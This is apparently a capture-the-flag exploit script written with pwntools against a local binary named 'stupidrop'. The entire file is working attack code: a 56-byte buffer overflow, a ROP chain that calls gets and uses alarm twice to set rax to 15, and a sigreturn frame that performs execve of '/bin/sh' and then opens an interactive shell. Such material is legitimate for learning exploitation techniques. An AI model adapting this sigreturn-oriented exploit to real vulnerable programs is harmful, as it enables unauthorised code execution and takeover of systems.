from pwn import *
import time

target = process('./stupidrop')
context.clear(arch='amd64')
#context.log_level = 'debug'

# get addresses of everything we need: where we will write "/bin/sh", the system call, alarm call, gets, and popRdi
bssAddr = p64(0x601051)
sys = p64(0x40063e)
alarm = p64(0x4004b0)
gets = p64(0x4004d0)
popRdi = p64(0x4006a3)

# set up our sigreturn to make a syscall
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x601051
frame.rdx = 0x0
frame.rsi = 0x0
frame.rip = 0x40063e


payload = b""
#gdb.attach(target, gdbscript = 'b *(main)')

# we call gets to write to the address that we would like to write "/bin/sh", then call alarm twice to set rax to 0xf
payload += b"A" * 56 + popRdi + bssAddr + gets + popRdi + p64(0xf) + alarm + popRdi + p64(0xff) + alarm + sys + bytes(frame)

time.sleep(1)
target.sendline(payload)

target.sendline(b"/bin//sh")

target.interactive()
